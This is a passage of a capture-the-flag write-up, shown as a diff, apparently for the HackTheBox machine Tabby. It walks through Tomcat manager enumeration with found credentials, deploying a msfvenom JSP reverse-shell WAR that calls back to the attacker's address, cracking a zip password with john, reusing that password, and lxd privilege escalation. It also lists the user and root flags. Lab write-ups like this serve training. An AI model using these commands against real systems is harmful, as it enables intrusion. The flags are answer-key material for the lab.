@@ -65,3 +65,97 @@ Found the credential
 
 `tomcat : $3cureP4s5w0rd123!`
 
+Further Enumeration in port : 8080
+
+`gobuster dir -u "http://10.129.34.1:8080" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
+
+```
+docs                 (Status: 302) [Size: 0] [--> /docs/]
+examples             (Status: 302) [Size: 0] [--> /examples/]
+host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
+index.html           (Status: 200) [Size: 1895]
+manager              (Status: 302) [Size: 0] [--> /manager/]
+```
+
+**Doing directory enumeration again in /manager**
+
+`gobuster dir -u "http://10.129.34.1:8080/manager/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --username tomcat --password '$3cureP4s5w0rd123!'`
+
+```
+html                 (Status: 403) [Size: 3446]
+images               (Status: 302) [Size: 0] [--> /manager/images/]
+status/ready         (Status: 200) [Size: 7136]
+status               (Status: 200) [Size: 7004]
+text                 (Status: 200) [Size: 31]
+```
+
+And it confirms `/manager/text` endpoint which is running Apache tomcat9 - Host manager app -- text interface service. (https://tomcat.apache.org/tomcat-9.0-doc/host-manager-howto.html)
+
+![](../Pasted%20image%2020260716145818.png)
+
+As of documentation, only the user with manage-script enabled can access "text interface"
+
+But, we did with the credential pair of tomcat. Let's list hosts using the above screenshot
+
+```
+USR=tomcat
+PASS=\$3cureP4s5w0rd123!
+
+curl -u ${USR}:${PASS} http://10.129.34.1:8080/manager/text/list
+```
+
+![](../Pasted%20image%2020260716150158.png)
+
+Now, we now tomcat is running, it renders java, generated a reverse shell payload with msfvenom
+
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.241 LPORT=1234 -f war -o shell.war`
+
+Uploading the payload:
+
+`curl -u ${USR}:${PASS} http://10.129.34.1:8080/manager/text/deploy?path=/examples/shell --upload-file shell.war`
+
+Triggering the payload: `curl "http://10.129.34.1:8080/examples/shell/"`
+
+![](../Pasted%20image%2020260716151328.png)
+
+And we got the shell as user - tomcat.
+
+And while exploring the application found a backup file in /var/www/html/files/16162020_backup.zip
+
+which is password protected, so we need to crack it.
+
+```johntheripper
+zip2john backup.zip > hash
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![](../Pasted%20image%2020260716152719.png)
+
+backup file password is `admin@it` and searched the zip file and got nothing interesting in here. 
+
+Then, just reused this password to login `su ash` and successfully gained access
+
+`user.txt : 4bca0501006a1d9f502f0f86195969c7`
+
+Root Escalation:
+
+```
+ash@tabby:~$ id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+```
+
+This user belongs to `lxd` group
+
+Refer `Linux Privesc` for LxD Exploitation.
+
+![](../Pasted%20image%2020260716155927.png)
+
+`root.txt : 2b0ccb6687290c6863b2d781fecf1383`
+
+Got the root access.
+
+
+**To be noted:**
+
+1. Need to do strong enumeration, i have missed enumerating /manager and got stucked in /host-manager as it's not accessed for the text interface service.
